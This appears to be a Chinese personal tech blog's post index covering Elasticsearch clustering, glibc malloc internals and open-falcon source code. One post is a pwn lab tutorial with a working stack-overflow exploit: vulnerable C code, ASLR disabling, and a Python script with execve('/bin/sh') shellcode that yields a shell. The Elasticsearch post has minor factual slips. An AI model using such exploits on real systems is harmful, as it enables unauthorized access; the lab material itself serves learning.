主节点\n\n主节点负责集群层面的相关操作，管理集群变更\n\n通过配置node.master:true节点具有被选举为master的资格，主节点是全局唯一的，将从有资格成为master的节点中进行选举。\n\n主节点也可以成为数据节点，但尽可能的做少量的工作，因此生产环境应尽量分离主节点和数据节点，创建独立节点的配置：\n\nnode.master: true\n\nnode.data: false\n\n为了防止数据丢失，每个主节点应该知道有资格成为主节点的数目，默认为1，为了避免网络分区时候出现多主的情况，配置discovery.zen.minimum_master_nodes原则上最小值应该是（master_eligible_nodes/2）+1\n\n2. 数据节点\n\n负责保存数据，执行数据相关操作，CRUD，搜索，聚合等，数据节点对CPU，内存，IO要求较高。通过配置node.data: true来使一个节点成为数据节点。也可以通过下面的配置:\n\nnode.master: false\n\nnode.data: true\n\nnode.ingest: false\n\n3. 预处理节点\n\n预处理节点在5.0之后引入。默认情况下在所有的节点上启用ingest，如果想在某个节点上禁用ingest，则可以添加配置node.ingest: false。也可以通过下面的配置创建一个仅用于预处理的节点：\n\nnode.master: false\n\nnode.data: false\n\nnode.ingest：false\n\n4. 协调节点\n\n客户端请求可以发送到集群的任意节点，每个节点都知道任意文档所在的位置，然后转发这些请求，收集数据并返回给客户端，处理客户端请求的节点称为协调节点。\n\n协调节点将请求转发给保存数据的数据节点。每个数据节点在本地执行请求，并将结果返回给协调节点，协调节点收集完数据之后将数据节点的结果合并为单个全局结果，对结果收集和排序的过程可能需要很多CPU和内存资源。\n\n配置：\n\nnode.master: false\n\nnode.data: false\n\nnode.ingest: false\n\n5. 部落节点\n\n允许部落节点在多个集群之间充当联合客户端\n\n客户端的属性：\n\nnode.master: false\n\nnode.data: false\n\n它不做主节点，不做数据节点，仅用于路由请求，本质上是一个智能负载均衡器。\n\n### 集群的健康度状态\n\n集群的健康度状态分为三种：\n\n1. Green: 主分片和副分片都正常运行\n2. Yellow: 所有的主分片都正常运行，但不是所有的副分片都正常运行，意味着有单点故障的风险。\n3. Red: 有主分片没能正常运行\n\n### 集群扩容\n\n当扩容集群，添加节点时候，分片会均衡地分配到集群的每个节点上，从而对索引和搜索过程进行负载均衡，这些都是系统自动完成。\n\n分片副本实现数据冗余，从而防止硬件故障导致的数据丢失。\n\n### 主要内部模块介绍\n\n#### Cluster\n\nCluster模块是主节点执行集群管理的我封装实现，管理集群状态，维护集群层面的配置信息。主要功能：\n\n* 管理集群状态，将新生成的集群状态发布到集群节点\n* 调用allocation模块执行分片分配，决策那些分片应该分配到哪个节点\n* 集群各节点中直接迁移分片，保持数据平衡\n\n#### allocation\n\n封装分片分配相关的功能和策略，包括主分片的分配和副分片的分配，本模块由主节点调用。创建新索引，集群完全重启都需要分片分配的过程\n\n#### Discovery\n\n发现模块负责发现集群中的节点，以及选举主节点。当节点加入或退出集群时，主节点会采取相应的行动。\n\n#### Gateway\n\n负责对收到Master广播下来的集群状态数据的持久化存储，并在集群完全重启时恢复他们。\n\n#### Indices\n\n索引模块管理全局级的索引设置，不包括索引级的，它还封装了索引数据恢复功能。集群启动阶段需要的主分片恢复和副分片恢复就是在这个模块实现。\n\n#### HTTP\n\nHTTP模块允许通过JSON over HTTP的方式访问ES的API，HTTP模块本质上完全异步的，意味着没有阻塞线程等待响应。使用异步通信进行HTTP的好处是解决了C10k问题（10k量级的并发连接）。\n\n在部分场景中，可考虑使用HTTP keepalive来提升性能，注意，不要在客户端使用http chunking\n\n#### Transport\n\n传输模块用于集群内节点之间的内部通信，从一个节点到另一个节点的每个请求都使用传输模块。\n\n#### Engine\n\nEngine模块封装了对Lucene的操作及translog的调用，它是对一个分片读写操作的最终提供者。\n\n### 选主算法\n\nbolly算法：选择ID较大的，在es中选择id较小的机器为master节点。\n\n","tags":["ElasticSearch"],"categories":["ElasticSearch"]},{"title":"ptmalloc学习","url":"/2020/01/26/ptmalloc学习/","content":"\n## ptmalloc学习\n\nptmalloc2 是linux glibc中当前使用的内存堆分配。之前使用的dlmalloc，现在逐步都被支持多线程的ptmalloc来替代了。\n\n我们之前学习过系统底层是调用的brk和mmap来实现内存分配的。\n\nptmalloc2多线程情况下分配内存的时候，每个线程有一个独立的heap segment和freelist数据结构保持于其他堆独立。这个行为我们称作为per thread arena;\n\n需要注意的是，即使用户请求内存只有1000字节，堆内存分配的时候还是会提供132KB大小被创建。这种连续的堆内存区域我们称作为arena。主线程创建的我们称作为main arena;\n\n如果当程序超过了这个arena区域可用空寂哦哦安的时候，他能够增加通过程序break位置的方式。top chunk大小可以适配 extra space空间。类似的如果有很多可用空间在top chunk中的时候，他可以缩小。\n\n除了这个1ＭＢ的堆分配外，只有132KB的读写权限被设置，因此这个连续的内存区域被称作为thread arena;如果超过128KB（132*1024）请求大小，超过了malloc可用空间的时候，内存分配通过使用mmap系统调用来申请，无论请求来自于main arena还是thread arena; arena的限制来自于系统的cores数目；\n\n32bit: Number of arena = 2 * number of cores;\n\n63bit: Number of arena = 8 * number of cores;\n\nheap的主要信息有下面这些：\n\nheap_info： heap header信息，单线程thread arena能有多堆。\n\nmalloc_state: arena header\n\nmalloc_chunk:  chunk_header\n\nmain arena因为没有多heap，所以没有heap_info。不像thread arena，main arena header不是sbrk的 heap segment的一部分。他是一个全局变量，因此可以在libc.so data segment找到。\n\n![img](https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720)\n\n![img](https://docs.google.com/drawings/d/1367fdYcRTvkyfZ_s27yg6oJp5KYsVAuYqPf8szbRNc0/pub?w=960&h=720)\n\n![img](https://docs.google.com/drawings/d/150bTi0uScQlnABDImLYS8rWyL82mmfpMxzRbx-45UKw/pub?w=960&h=720)\n\nchunk: 一个chunk包含在一个heap segment中，包括以下几个：\n\n1. allocated chunk\n\n   ![img](https://docs.google.com/drawings/d/1eLkG-WF9U3O_ytNs6iFKHacqkjWZeY4KtLqxmd01EVs/pub?w=962&h=682)\n\n2. free chunk\n\n   ![img](https://docs.google.com/drawings/d/1YrlnGa081NpO0D3wcoaJbGvhnPi3X6bBKMc3bN4-oZQ/pub?w=940&h=669)\n\n   其中 bins是freelist的数据结构，在free chunk中被使用。\n\n   fast bin, unsorted bin, small bin, large bin\n\n   fastbinsY： 这个数组支持fastbins\n\n   bins: bin1  unsorted bin, bin2-bin63 small bin, bin64-bin126 large bin;\n\n   fastbin: chunk大小在16-80字节被称作为fast chunk;\n\n   ![img](https://docs.google.com/drawings/d/144diIfbLqUmOPlAWbtP45mGsZlIl3PZWJvvH-cvQziU/pub?w=960&h=720)\n\n   unsorted bin: \n\n   当释放小块或大块时，而不是将它们添加到各自的容器，将他们释放的空间放入unsortedbin中。这种方式给了glibc malloc重用最近释放的chunk的机会。因此，内存分配和释放会加快一点。因为寻找合适的垃圾箱所花费的时间减少了。\n\n   ![img](https://docs.google.com/drawings/d/1Kf_eg7uB2mRjSOasTc4dIu5fuBpTAK0GxbnKVTkZd0Y/pub?w=1217&h=865)\n\n   small bin: chunk小于512字节的被称作为small chunk;\n\n   large bin: chunk大于512字节的被称作为large chunk;\n\n3. Top Chunk：\n\n   在top边界上的arena被称作为top chunk;\n\n4. Last Remainder Chunk：\n\n   从最近的一个小请求分裂。最后的剩余块有助于改善引用的局部性，即小块的连续的malloc请求可能最终被分配到彼此接近的地方。\n\n### 参考\n\nhttps://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/\n\nhttps://www.cnblogs.com/alisecurity/p/5486458.html\n\n\n\n\n\n","tags":["malloc"],"categories":["malloc"]},{"title":"Linux Malloc底层分配原理【翻译】","url":"/2020/01/24/linux内存malloc底层实现/","content":"\n## Linux Malloc底层分配原理【翻译】\n\nlinux中malloc函数还是通过syscall来分配内存的。通过调用brk或者mmap syscall函数来分配内存。\n\n![img](https://docs.google.com/drawings/d/105HDvkEvIW2lsyaQjj758Lbyx6A-_K7jviheyzeAwl8/pub?w=480&h=238)\n\nbrk函数：从内核分配内存（非0初始化）通过增加程序break位置来实现。初始化堆segment得开始与结束指向相同的位置。\n\n如果ASLR关闭的时候，start_brk和brk将指向data/bss segment结束的位置。\n\n如果ASLR打开的时候，start_brk和brk将等于data/bss segment结束的位置通过随机brk offset\n\n![img](https://i2.wp.com/static.duartes.org/img/blogPosts/linuxFlexibleAddressSpaceLayout.png)\n\nmmap: malloc函数使用mmap来创建一个私有匿名映射segment.分配私有匿名的主要目的是分配一个新的内存（0填充的）这个新的内存将被调用进程的时候额外使用。\n\n\n\n### 参考\n\nhttps://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/\n\nhttps://manybutfinite.com/post/anatomy-of-a-program-in-memory/\n\n\n\n","tags":["malloc"],"categories":["malloc"]},{"title":"pwn学习笔记1","url":"/2020/01/23/pwn学习笔记/","content":"\n## pwn学习笔记1\n\n### 学习笔记\n\n其实参考的是https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/文章中的教程，学习下pwn的基础知识。\n\n环境：ubuntu14.04\n\n漏洞代码：\n\n```c\n//vuln.c\n#include <stdio.h>\n#include <string.h>\n\nint main(int argc, char* argv[]) {\n        /* [1] */ char buf[256];\n        /* [2] */ strcpy(buf,argv[1]);\n        /* [3] */ printf(\"Input:%s\\n\",buf);\n        return 0;\n}\n```\n\n其实就是简单的栈溢出利用，超过256个字符的时候会发生栈溢出问题。\n\n首先我们需要关闭内存地址随机化。保证栈溢出地址固定。\n\n```ruby\necho 0 > /proc/sys/kernel/randomize_va_space\n```\n\n编译和打开栈执行\n\n```\ngcc -g -fno-stack-protector -z execstack -o vul1 vul1.c\nchmod +s vul1\n```\n\ngdb调试：\n\n```shell\nsaar@saar-virtual-machine:~/pwn$ gdb vul1 \nGNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1\nCopyright (C) 2014 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"i686-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from vul1...done.\ngdb-peda$ dis\ndisable      disassemble  disconnect   display      distance     \ngdb-peda$ disassemble main\nDump of assembler code for function main:\n   0x0804844d <+0>:     push   ebp\n   0x0804844e <+1>:     mov    ebp,esp\n   0x08048450 <+3>:     and    esp,0xfffffff0\n   0x08048453 <+6>:     sub    esp,0x110\n   0x08048459 <+12>:    mov    eax,DWORD PTR [ebp+0xc]\n   0x0804845c <+15>:    add    eax,0x4\n   0x0804845f <+18>:    mov    eax,DWORD PTR [eax]\n   0x08048461 <+20>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048465 <+24>:    lea    eax,[esp+0x10]\n   0x08048469 <+28>:    mov    DWORD PTR [esp],eax\n   0x0804846c <+31>:    call   0x8048320 <strcpy@plt>\n   0x08048471 <+36>:    lea    eax,[esp+0x10]\n   0x08048475 <+40>:    mov    DWORD PTR [esp+0x4],eax\n   0x08048479 <+44>:    mov    DWORD PTR [esp],0x8048520\n   0x08048480 <+51>:    call   0x8048310 <printf@plt>\n   0x08048485 <+56>:    mov    eax,0x0\n   0x0804848a <+61>:    leave  \n   0x0804848b <+62>:    ret    \nEnd of assembler dump.\ngdb-peda$ r `python -c 'print \"A\"*400'`\nStarting program: /home/saar/pwn/vul1 `python -c 'print \"A\"*400'`\nInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x0 \nEBX: 0xb7fc0000 --> 0x1acda8 \nECX: 0x0 \nEDX: 0xb7fc1898 --> 0x0 \nESI: 0x0 \nEDI: 0x0 \nEBP: 0x41414141 ('AAAA')\nESP: 0xbffff460 ('A' <repeats 128 times>)\nEIP: 0x41414141 ('AAAA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414141\n[------------------------------------stack-------------------------------------]\n0000| 0xbffff460 ('A' <repeats 128 times>)\n0004| 0xbffff464 ('A' <repeats 124 times>)\n0008| 0xbffff468 ('A' <repeats 120 times>)\n0012| 0xbffff46c ('A' <repeats 116 times>)\n0016| 0xbffff470 ('A' <repeats 112 times>)\n0020| 0xbffff474 ('A' <repeats 108 times>)\n0024| 0xbffff478 ('A' <repeats 104 times>)\n0028| 0xbffff47c ('A' <repeats 100 times>)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414141 in ?? ()\n```\n\nesp 地址是：0xbffff460，\n\n发现ret_address需要保证esp+N<nop的数目\n\n```python\n#exp.py \n#!/usr/bin/env python\nimport struct\nfrom subprocess import call\n\n#Stack address where shellcode is copied.\nret_addr = 0xbffff480      \n              \n#Spawn a shell\n#execve(/bin/sh)\nscode = \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\"\n\n#endianess convertion\ndef conv(num):\n return struct.pack(\"<I\",num)\n\n# buf = Junk + RA + NOP's + Shellcode\nbuf = \"A\" * 268\nbuf += conv(ret_addr)\nbuf += \"\\x90\" * 40\nbuf += scode\n\nprint \"Calling vulnerable program\"\ncall([\"./vul1\", buf])\n```\n\n最后获取shell:\n\n```shell\nsaar@saar-virtual-machine:~/pwn$ python exp.py \nCalling vulnerable program\nInput:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA1/shh/bin\n\n$ \n$ id\nuid=1000(saar) gid=1000(saar) groups=1000(saar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare)\n$ \n```\n\n\n\n### 参考\n\nhttps://www.jianshu.com/p/187b810e78d2\n\nhttps://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/","tags":["pwn"],"categories":["pwn"]},{"title":"open-falcon transfer 源码分析","url":"/2020/01/21/transfer源码分析/","content":"## open-falcon transfer 源码分析\n\ntransfer模块是小米监控中比较重要的环境，主要用于发送数据给graph,judge,等。\n\n主要流程在modules/transfer/main.go\n\n```go\nfunc main() {\n\tg.BinaryName = BinaryName\n\tg.Version = Version\n\tg.GitCommit = GitCommit\n\n\tcfg := flag.String(\"c\", \"cfg.json\", \"configuration file\")\n\tversion := flag.Bool(\"v\", false, \"show version\")\n\tversionGit := flag.Bool(\"vg\", false, \"show version\")\n\tflag.Parse()\n\n\tif *version {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\tif *versionGit {\n\t\tfmt.Printf(\"Open-Falcon %s version %s, build %s\\n\", BinaryName, Version, GitCommit)\n\t\tos.Exit(0)\n\t}\n\n\t// global config\n    // 解析配置文件\n\tg.ParseConfig(*cfg)\n\t// proc\n    // 就是打印日志。。orz\n\tproc.Start()\n\n    // 发送端启动\n\tsender.Start()\n    // 接收数据启动\n\treceiver.Start()\n\n\t// http\n    //  http服务启动\n\thttp.Start()\n\n\tselect {}\n}\n```\n\n先来看下发送端的代码：\n\n```go\n// 初始化数据发送服务, 在main函数中调用\nfunc Start() {\n\t// 初始化默认参数\n\tMinStep = g.Config().MinStep\n\tif MinStep < 1 {\n\t\tMinStep = 30 //默认30s\n\t}\n\t//初始化连接池\n\tinitConnPools()\n    //初始化发送队列\n\tinitSendQueues()\n\t//初始化hash环，用于做一致性hash分片\n    initNodeRings()\n\t// SendTasks依赖基础组件的初始化,要最后启动\n\tstartSendTasks()\n    //启动发送定时任务\n\tstartSenderCron()\n\tlog.Println(\"send.Start, ok\")\n}\n```\n\n```go\nfunc initConnPools() {\n\tcfg := g.Config()\n\n\t// judge\n    // 读取配置文件，加载进来\n\tjudgeInstances := nset.NewStringSet()\n\tfor _, instance := range cfg.Judge.Cluster {\n\t\tjudgeInstances.Add(instance)\n\t}\n\tJudgeConnPools = backend.CreateSafeRpcConnPools(cfg.Judge.MaxConns, cfg.Judge.MaxIdle,\n\t\tcfg.Judge.ConnTimeout, cfg.Judge.CallTimeout, judgeInstances.ToSlice())\n\n\t// tsdb，是否开启tsdb，初始化\n\tif cfg.Tsdb.Enabled {\n\t\tTsdbConnPoolHelper = backend.NewTsdbConnPoolHelper(cfg.Tsdb.Address, cfg.Tsdb.MaxConns, cfg.Tsdb.MaxIdle, cfg.Tsdb.ConnTimeout, cfg.Tsdb.CallTimeout)\n\t}\n\n\t// graph\n    // graph地址初始化\n\tgraphInstances := nset.NewSafeSet()\n\tfor _, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tgraphInstances.Add(addr)\n\t\t}\n\t}\n\tGraphConnPools = backend.CreateSafeRpcConnPools(cfg.Graph.MaxConns, cfg.Graph.MaxIdle,\n\t\tcfg.Graph.ConnTimeout, cfg.Graph.CallTimeout, graphInstances.ToSlice())\n\n}\n```\n\n初始化发送队列：\n\n```go\n\nfunc initSendQueues() {\n\tcfg := g.Config()\n    // 对每个judge节点构建一个队列\n\tfor node := range cfg.Judge.Cluster {\n\t\tQ := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t\tJudgeQueues[node] = Q\n\t}\n\t// 对每个graph节点构建一个队列\n\tfor node, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tQ := nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t\t\tGraphQueues[node+addr] = Q\n\t\t}\n\t}\n\t// 对tsdb节点构建队列\n\tif cfg.Tsdb.Enabled {\n\t\tTsdbQueue = nlist.NewSafeListLimited(DefaultSendQueueMaxSize)\n\t}\n}\n```\n\ninitNodeRings构建hash环，用于一致性hash初始化。\n\n```go\nfunc initNodeRings() {\n\tcfg := g.Config()\n\n\tJudgeNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Judge.Replicas), cutils.KeysOfMap(cfg.Judge.Cluster))\n\tGraphNodeRing = rings.NewConsistentHashNodesRing(int32(cfg.Graph.Replicas), cutils.KeysOfMap(cfg.Graph.Cluster))\n}\n```\n\nstartSendTasks函数启动发送任务：\n\n```go\n// TODO 添加对发送任务的控制,比如stop等\nfunc startSendTasks() {\n\tcfg := g.Config()\n\t// init semaphore\n\tjudgeConcurrent := cfg.Judge.MaxConns\n\tgraphConcurrent := cfg.Graph.MaxConns\n\ttsdbConcurrent := cfg.Tsdb.MaxConns\n\n\tif tsdbConcurrent < 1 {\n\t\ttsdbConcurrent = 1\n\t}\n\n\tif judgeConcurrent < 1 {\n\t\tjudgeConcurrent = 1\n\t}\n\n\tif graphConcurrent < 1 {\n\t\tgraphConcurrent = 1\n\t}\n\n\t// init send go-routines\n\tfor node := range cfg.Judge.Cluster {\n\t\tqueue := JudgeQueues[node]\n\t\tgo forward2JudgeTask(queue, node, judgeConcurrent)\n\t}\n\n\tfor node, nitem := range cfg.Graph.ClusterList {\n\t\tfor _, addr := range nitem.Addrs {\n\t\t\tqueue := GraphQueues[node+addr]\n\t\t\tgo forward2GraphTask(queue, node, addr, graphConcurrent)\n\t\t}\n\t}\n\n\tif cfg.Tsdb.Enabled {\n\t\tgo forward2TsdbTask(tsdbConcurrent)\n\t}\n}\n```\n\nforward2JudgeTask函数用于启动judge发送任务：\n\n```go\n// Judge定时任务, 将 Judge发送缓存中的数据 通过rpc连接池 发送到Judge\nfunc forward2JudgeTask(Q *list.SafeListLimited, node string, concurrent int) {\n\tbatch := g.Config().Judge.Batch // 一次发送,最多batch条数据\n\taddr := g.Config().Judge.Cluster[node]\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := Q.PopBackBy(batch)\n\t\tcount := len(items)\n\t\tif count == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\n\t\tjudgeItems := make([]*cmodel.JudgeItem, count)\n\t\tfor i := 0; i < count; i++ {\n\t\t\tjudgeItems[i] = items[i].(*cmodel.JudgeItem)\n\t\t}\n\n\t\t//\t同步Call + 有限并发 进行发送\n\t\tsema.Acquire()\n\t\tgo func(addr string, judgeItems []*cmodel.JudgeItem, count int) {\n\t\t\tdefer sema.Release()\n\n\t\t\tresp := &cmodel.SimpleRpcResponse{}\n\t\t\tvar err error\n\t\t\tsendOk := false\n\t\t\tfor i := 0; i < 3; i++ { //最多重试3次\n                // 调用judge rpc send接口发送数据\n\t\t\t\terr = JudgeConnPools.Call(addr, \"Judge.Send\", judgeItems, resp)\n\t\t\t\tif err == nil {\n\t\t\t\t\tsendOk = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(time.Millisecond * 10)\n\t\t\t}\n\n\t\t\t// statistics\n\t\t\tif !sendOk {\n\t\t\t\tlog.Printf(\"send judge %s:%s fail: %v\", node, addr, err)\n\t\t\t\tproc.SendToJudgeFailCnt.IncrBy(int64(count))\n\t\t\t} else {\n\t\t\t\tproc.SendToJudgeCnt.IncrBy(int64(count))\n\t\t\t}\n\t\t}(addr, judgeItems, count)\n\t}\n}\n```\n\nforward2GraphTask启动发送存档数据：\n\n```go\n// Graph定时任务, 将 Graph发送缓存中的数据 通过rpc连接池 发送到Graph\nfunc forward2GraphTask(Q *list.SafeListLimited, node string, addr string, concurrent int) {\n\tbatch := g.Config().Graph.Batch // 一次发送,最多batch条数据\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := Q.PopBackBy(batch) //从队列中pop指定大小的数据\n\t\tcount := len(items)\n\t\tif count == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\n\t\tgraphItems := make([]*cmodel.GraphItem, count)\n\t\tfor i := 0; i < count; i++ {\n\t\t\tgraphItems[i] = items[i].(*cmodel.GraphItem)\n\t\t}\n\n\t\tsema.Acquire()\n\t\tgo func(addr string, graphItems []*cmodel.GraphItem, count int) {\n\t\t\tdefer sema.Release()\n\n\t\t\tresp := &cmodel.SimpleRpcResponse{}\n\t\t\tvar err error\n\t\t\tsendOk := false\n\t\t\tfor i := 0; i < 3; i++ { //最多重试3次\n                // 给graph接口发送数据\n\t\t\t\terr = GraphConnPools.Call(addr, \"Graph.Send\", graphItems, resp)\n\t\t\t\tif err == nil {\n\t\t\t\t\tsendOk = true\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(time.Millisecond * 10)\n\t\t\t}\n\n\t\t\t// statistics\n            //   统计数据，方便后续排查当前队列中发送失败和成功数据量\n\t\t\tif !sendOk {\n\t\t\t\tlog.Printf(\"send to graph %s:%s fail: %v\", node, addr, err)\n\t\t\t\tproc.SendToGraphFailCnt.IncrBy(int64(count))\n\t\t\t} else {\n\t\t\t\tproc.SendToGraphCnt.IncrBy(int64(count))\n\t\t\t}\n\t\t}(addr, graphItems, count)\n\t}\n}\n```\n\n如果有使用tsdb的话，启动tsdb发送task，这边不说了，基本流程类似。\n\n```go\n// Tsdb定时任务, 将数据通过api发送到tsdb\nfunc forward2TsdbTask(concurrent int) {\n\tbatch := g.Config().Tsdb.Batch // 一次发送,最多batch条数据\n\tretry := g.Config().Tsdb.MaxRetry\n\tsema := nsema.NewSemaphore(concurrent)\n\n\tfor {\n\t\titems := TsdbQueue.PopBackBy(batch)\n\t\tif len(items) == 0 {\n\t\t\ttime.Sleep(DefaultSendTaskSleepInterval)\n\t\t\tcontinue\n\t\t}\n\t\t//  同步Call + 有限并发 进行发送\n\t\tsema.Acquire()\n\t\tgo func(itemList []interface{}) {\n\t\t\tdefer sema.Release()\n\n\t\t\tvar tsdbBuffer bytes.Buffer\n\t\t\tcount := len(itemList)\n\t\t\tfor i := 0; i < count; i++ {\n\t\t\t\ttsdbItem := itemList[i].(*cmodel.TsdbItem)\n\t\t\t\ttsdbBuffer.WriteString(tsdbItem.TsdbString())\n\t\t\t\ttsdbBuffer.WriteString(\"\\n\")\n\t\t\t}\n\n\t\t\tvar err error\n\t\t\tfor i := 0; i < retry; i++ {\n\t\t\t\terr = TsdbConnPoolHelper.Send(tsdbBuffer.Bytes())\n\t\t\t\tif err == nil {\n\t\t\t\t\tproc.SendToTsdbCnt.IncrBy(int64(len(itemList)))\n\t\t\t\t\tbreak\n\t\t\t\t}\n\t\t\t\ttime.Sleep(100 * time.Millisecond)\n\t\t\t}\n\n\t\t\tif err != nil {\n\t\t\t\tproc.SendToTsdbFailCnt.IncrBy(int64(len(itemList)))\n\t\t\t\tlog.Println(err)\n\t\t\t\treturn\n\t\t\t}\n\t\t}(items)\n\t}\n}\n```\n\n接下来函数startSenderCron函数中：\n\n```go\n// send_cron程序入口\nfunc startSenderCron() {\n\tgo startProcCron()  //发送队列统计\n\tgo startLogCron()    //打印日志\n}\n```\n\n发送队列统计数据\n\n```go\nfunc calcSendCacheSize(mapList map[string]*list.SafeListLimited) int64 {\n\tvar cnt int64 = 0\n\tfor _, list := range mapList {\n\t\tif list != nil {\n\t\t\tcnt += int64(list.Len())\n\t\t}\n\t}\n\treturn cnt\n}\n```\n\n接收数据函数\n\n```go\nfunc Start() {\n\tgo rpc.StartRpc()                // rpc接口数据，接收数据\n\tgo socket.StartSocket()          // tcp方式推送数据\n}\n```\n\n 主要看rpc接口，因为socket方式也是小米提供的，底层传输的方法一样。\n\nrpc update接口用于更新数据并打到缓存队列中去，update方法最终调用RecvMetricValues函数：\n\n```go\n// process new metric values\nfunc RecvMetricValues(args []*cmodel.MetricValue, reply *cmodel.TransferResponse, from string) error {\n\tstart := time.Now()\n\treply.Invalid = 0\n\n\titems := []*cmodel.MetaData{}\n\tfor _, v := range args {\n\t\tif v == nil {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\t// 历史遗留问题.\n\t\t// 老版本agent上报的metric=kernel.hostname的数据,其取值为string类型,现在已经不支持了;所以,这里硬编码过滤掉\n        \n        // 很多的过滤策略。\n\t\tif v.Metric == \"kernel.hostname\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Metric == \"\" || v.Endpoint == \"\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Type != g.COUNTER && v.Type != g.GAUGE && v.Type != g.DERIVE {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Value == \"\" {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif v.Step <= 0 {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tif len(v.Metric)+len(v.Tags) > 510 {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\t// TODO 呵呵,这里需要再优雅一点\n\t\tnow := start.Unix()\n\t\tif v.Timestamp <= 0 || v.Timestamp > now*2 {\n\t\t\tv.Timestamp = now\n\t\t}\n\n\t\tfv := &cmodel.MetaData{\n\t\t\tMetric:      v.Metric,\n\t\t\tEndpoint:    v.Endpoint,\n\t\t\tTimestamp:   v.Timestamp,\n\t\t\tStep:        v.Step,\n\t\t\tCounterType: v.Type,\n\t\t\tTags:        cutils.DictedTagstring(v.Tags), //TODO tags键值对的个数,要做一下限制\n\t\t}\n\n\t\tvalid := true\n\t\tvar vv float64\n\t\tvar err error\n\n\t\tswitch cv := v.Value.(type) {\n\t\tcase string:\n\t\t\tvv, err = strconv.ParseFloat(cv, 64)\n\t\t\tif err != nil {\n\t\t\t\tvalid = false\n\t\t\t}\n\t\tcase float64:\n\t\t\tvv = cv\n\t\tcase int64:\n\t\t\tvv = float64(cv)\n\t\tdefault:\n\t\t\tvalid = false\n\t\t}\n\n\t\tif !valid {\n\t\t\treply.Invalid += 1\n\t\t\tcontinue\n\t\t}\n\n\t\tfv.Value = vv\n\t\titems = append(items, fv)\n\t}\n\n\t// statistics\n\tcnt := int64(len(items))\n\tproc.RecvCnt.IncrBy(cnt)\n    // 统计\n\tif from == \"rpc\" {\n\t\tproc.RpcRecvCnt.IncrBy(cnt)\n\t} else if from == \"http\" 